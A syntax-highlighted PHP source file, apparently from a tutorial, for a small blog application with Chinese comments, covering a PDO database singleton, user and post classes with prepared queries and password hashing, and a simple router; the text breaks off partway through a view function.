<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 命名空间和引入</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">BlogApp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTime</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PDOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 配置</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>, <span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_NAME&quot;</span>, <span class="string">&quot;blog_db&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USER&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASS&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;MAX_POSTS_PER_PAGE&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态缓存</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：清理输入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>), ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：重定向</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取当前URL</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCurrentUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$protocol</span> = <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] === <span class="string">&#x27;on&#x27;</span> ? <span class="string">&#x27;https&#x27;</span> : <span class="string">&#x27;http&#x27;</span>;</span><br><span class="line">        <span class="variable">$host</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>];</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">$protocol</span>://<span class="subst">$host</span><span class="subst">$uri</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：缓存结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cached</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$callback</span>, <span class="variable">$ttl</span> = <span class="number">3600</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$callback</span>();</span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$cache</span>[<span class="variable">$key</span>] = <span class="variable">$result</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 数据库连接类（单例模式）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pdo</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 私有构造函数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=&quot;</span> . DB_HOST . <span class="string">&quot;;dbname=&quot;</span> . DB_NAME . <span class="string">&quot;;charset=utf8&quot;</span>;</span><br><span class="line">            <span class="variable">$options</span> = [</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>,</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_DEFAULT_FETCH_MODE</span> =&gt; PDO::<span class="variable constant_">FETCH_ASSOC</span>,</span><br><span class="line">                PDO::<span class="variable constant_">ATTR_PERSISTENT</span> =&gt; <span class="literal">true</span></span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pdo = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, DB_USER, DB_PASS, <span class="variable">$options</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Database connection failed: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取单例实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;pdo;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：执行查询</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取所有结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, <span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取单行结果</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchOne</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, <span class="variable">$params</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：插入数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$columns</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$data</span>));</span><br><span class="line">        <span class="variable">$placeholders</span> = <span class="string">&#x27;:&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,:&#x27;</span>, <span class="title function_ invoke__">array_keys</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$columns</span>) VALUES (<span class="subst">$placeholders</span>)&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>, <span class="variable">$data</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$instance</span>-&gt;pdo-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 用户类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态缓存</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$userCache</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$email</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_DEFAULT);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$userId</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;users&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;name,</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;email,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;password</span><br><span class="line">        ]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$userId</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：用户认证</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$email</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE email = :email&quot;</span>;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchOne</span>(<span class="variable">$sql</span>, [<span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span> &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取用户</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getById</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 检查缓存</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$userCache</span>[<span class="variable">$id</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$userCache</span>[<span class="variable">$id</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = :id&quot;</span>;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchOne</span>(<span class="variable">$sql</span>, [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$id</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 缓存结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$userCache</span>[<span class="variable">$id</span>] = <span class="variable">$user</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取所有用户</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchAll</span>(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 博客文章类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Post</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$title</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$authorId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$createdAt</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$authorId</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$title</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;authorId = <span class="variable">$authorId</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;createdAt = <span class="keyword">new</span> <span class="title class_">DateTime</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$postId</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;posts&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;title,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;content,</span><br><span class="line">            <span class="string">&#x27;author_id&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;authorId,</span><br><span class="line">            <span class="string">&#x27;created_at&#x27;</span> =&gt; <span class="variable">$this</span>-&gt;createdAt-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>)</span><br><span class="line">        ]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$postId</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取所有文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getAll</span>(<span class="params"><span class="variable">$page</span> = <span class="number">1</span>, <span class="variable">$limit</span> = MAX_POSTS_PER_PAGE</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$offset</span> = (<span class="variable">$page</span> - <span class="number">1</span>) * <span class="variable">$limit</span>;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT p.*, u.name as author_name </span></span><br><span class="line"><span class="string">                FROM posts p</span></span><br><span class="line"><span class="string">                JOIN users u ON p.author_id = u.id</span></span><br><span class="line"><span class="string">                ORDER BY p.created_at DESC</span></span><br><span class="line"><span class="string">                LIMIT :limit OFFSET :offset&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$stmt</span> = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>()-&gt;<span class="title function_ invoke__">getConnection</span>()-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:limit&#x27;</span>, (<span class="keyword">int</span>)<span class="variable">$limit</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:offset&#x27;</span>, (<span class="keyword">int</span>)<span class="variable">$offset</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取文章总数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchOne</span>(<span class="string">&quot;SELECT COUNT(*) as count FROM posts&quot;</span>)[<span class="string">&#x27;count&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取单篇文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getById</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT p.*, u.name as author_name </span></span><br><span class="line"><span class="string">                FROM posts p</span></span><br><span class="line"><span class="string">                JOIN users u ON p.author_id = u.id</span></span><br><span class="line"><span class="string">                WHERE p.id = :id&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchOne</span>(<span class="variable">$sql</span>, [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$id</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：按作者获取文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getByAuthor</span>(<span class="params"><span class="variable">$authorId</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM posts WHERE author_id = :author_id ORDER BY created_at DESC&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchAll</span>(<span class="variable">$sql</span>, [<span class="string">&#x27;:author_id&#x27;</span> =&gt; <span class="variable">$authorId</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：搜索文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"><span class="variable">$query</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT p.*, u.name as author_name </span></span><br><span class="line"><span class="string">                FROM posts p</span></span><br><span class="line"><span class="string">                JOIN users u ON p.author_id = u.id</span></span><br><span class="line"><span class="string">                WHERE p.title LIKE :query OR p.content LIKE :query</span></span><br><span class="line"><span class="string">                ORDER BY p.created_at DESC&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Database</span>::<span class="title function_ invoke__">fetchAll</span>(<span class="variable">$sql</span>, [<span class="string">&#x27;:query&#x27;</span> =&gt; <span class="string">&quot;%<span class="subst">$query</span>%&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 路由处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态文件处理</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.(css|js|png|jpg|jpeg|gif)$/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 路由</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> === <span class="string">&#x27;/&#x27;</span> || <span class="variable">$path</span> === <span class="string">&#x27;/index.php&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showHome</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/login&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showLoginForm</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/login&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">processLogin</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/register&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showRegistrationForm</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/register&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">processRegistration</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/post\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showPost</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/create&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showCreateForm</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/create&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">processCreatePost</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/search&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">showSearchResults</span>();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$path</span> === <span class="string">&#x27;/logout&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">processLogout</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">show404</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 视图函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>, <span class="variable">$data</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;views/<span class="subst">$template</span>.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHome</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) ? (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$posts</span> = <span class="title class_">Post</span>::<span class="title function_ invoke__">getAll</span>(<span class="variable">$page</span>);</span><br><span class="line">    <span class="variable">$totalPosts</span> = <span class="title class_">Post</span>::<span class="title function_ invoke__">getCount</span>();</span><br><span class="line">    <span class="variable">$totalPages</span> = <span class="title function_ invoke__">ceil</span>(<span class="variable">$totalPosts</span> / MAX_POSTS_PER_PAGE);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">render</span>(<span class="string">&#x27;home&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;My Blog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;posts&#x27;</span> =&gt; <span class="variable">$posts</span>,</span><br><span class="line">        <span class="string">&#x27;currentPage&#x27;</span> =&gt; <span class="variable">$page</span>,</span><br><span class="line">        <span class="string">&#x27;totalPages&#x27;</span> =&gt; <span class="variable">$totalPages</span>,</span><br><span class="line">        <span class="string">&#x27;hasNextPage&#x27;</span> =&gt; <span class="variable">$page</span> &lt; <span class="variable">$totalPages</span>,</span><br><span class="line">        <span 